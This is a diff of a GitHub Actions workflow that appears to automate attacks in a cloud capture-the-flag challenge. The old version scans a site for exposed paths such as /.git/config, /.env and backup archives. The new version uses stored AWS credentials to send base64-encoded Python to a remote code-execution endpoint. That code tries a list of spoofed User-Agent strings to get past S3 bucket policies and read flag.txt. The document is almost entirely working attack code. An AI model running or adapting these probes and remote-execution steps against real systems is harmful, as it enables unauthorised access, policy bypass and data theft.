@@ -1,4 +1,4 @@
-name: Stage2-04-Public-Artifact-Probe
+name: Stage2-05-UserAgent-Matrix
 
 on:
   push:
@@ -12,50 +12,113 @@ jobs:
   probe:
     runs-on: ubuntu-latest
 
+    env:
+      AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
+      AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
+      AWS_SESSION_TOKEN: ${{ secrets.AWS_SESSION_TOKEN }}
+      API_URL: https://l8ssyaz69f.execute-api.us-east-1.amazonaws.com/dev/code_exec
+
     steps:
-      - name: Probe public site paths
+      - name: Install dependencies
         run: |
-          set +e
+          python3 -m pip install requests requests-aws4auth --quiet
 
-          BASE="https://d4ysu55xg7wfi.cloudfront.net"
+      - name: Test User-Agent candidates
+        run: |
+          python3 - <<'PY'
+          import os
+          import base64
+          import requests
+          from requests_aws4auth import AWS4Auth
 
-          paths="
-          /
-          /index.html
-          /docs.html
-          /robots.txt
-          /sitemap.xml
-          /.git/
-          /.git/HEAD
-          /.git/config
-          /.git/index
-          /.git/description
-          /.git/logs/HEAD
-          /.env
-          /flag.txt
-          /backup.zip
-          /site.zip
-          /source.zip
-          /lambda_function.py
-          /bucket_policy.json
-          /policy.json
-          "
+          auth = AWS4Auth(
+              os.environ["AWS_ACCESS_KEY_ID"],
+              os.environ["AWS_SECRET_ACCESS_KEY"],
+              "us-east-1",
+              "execute-api",
+              session_token=os.environ["AWS_SESSION_TOKEN"]
+          )
 
-          while IFS= read -r path; do
-            [ -z "$path" ] && continue
+          user_agents = [
+              "Amazon CloudFront",
+              "CloudFront",
+              "cloudfront",
+              "aws-cli",
+              "AWS CLI",
+              "aws-sdk-python",
+              "Boto3",
+              "botocore",
+              "curl",
+              "REDACTED",
+              "CloudEscape",
+              "CloudEscape-Agent",
+              "corgi",
+              "Ilayzandani",
+              "Mozilla/5.0",
+              "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36"
+          ]
 
-            echo "===== $path ====="
+          buckets = [
+              "userad88e2b168aa387e",
+              "logad88e2b168aa387e"
+          ]
 
-            curl \
-              --silent \
-              --show-error \
-              --location \
-              --max-time 15 \
-              --output /tmp/probe_body \
-              --write-out "HTTP=%{http_code} SIZE=%{size_download} TYPE=%{content_type}\n" \
-              "$BASE$path"
+          for user_agent in user_agents:
+              for bucket in buckets:
+                  code = f'''
+          import os
+          import subprocess
 
-            head -c 300 /tmp/probe_body
-            echo
-            echo
-          done <<< "$paths"
+          url = "https://s3.us-east-1.amazonaws.com/{bucket}/flag.txt"
+
+          command = [
+              "curl",
+              "--silent",
+              "--show-error",
+              "--head",
+              "--aws-sigv4",
+              "aws:amz:us-east-1:s3",
+              "--user",
+              os.environ["AWS_ACCESS_KEY_ID"] + ":" + os.environ["AWS_SECRET_ACCESS_KEY"],
+              "-H",
+              "x-amz-security-token: " + os.environ["AWS_SESSION_TOKEN"],
+              "-A",
+              {user_agent!r},
+              url
+          ]
+
+          result = subprocess.run(
+              command,
+              stdout=subprocess.PIPE,
+              stderr=subprocess.PIPE,
+              text=True
+          )
+
+          output = result.stdout + result.stderr
+
+          if " 200 " in output or " 206 " in output:
+              raise SystemExit(7)
+
+          if " 403 " in output or "AccessDenied" in output:
+              raise SystemExit(10)
+
+          if " 404 " in output or "NoSuchKey" in output:
+              raise SystemExit(12)
+
+          raise SystemExit(19)
+          '''
+
+                  encoded = base64.b64encode(code.encode()).decode()
+
+                  response = requests.post(
+                      os.environ["API_URL"],
+                      json={"code": encoded},
+                      auth=auth,
+                      timeout=40
+                  )
+
+                  print(f"UA={user_agent}")
+                  print(f"BUCKET={bucket}")
+                  print(response.text)
+                  print("---")
+          PY
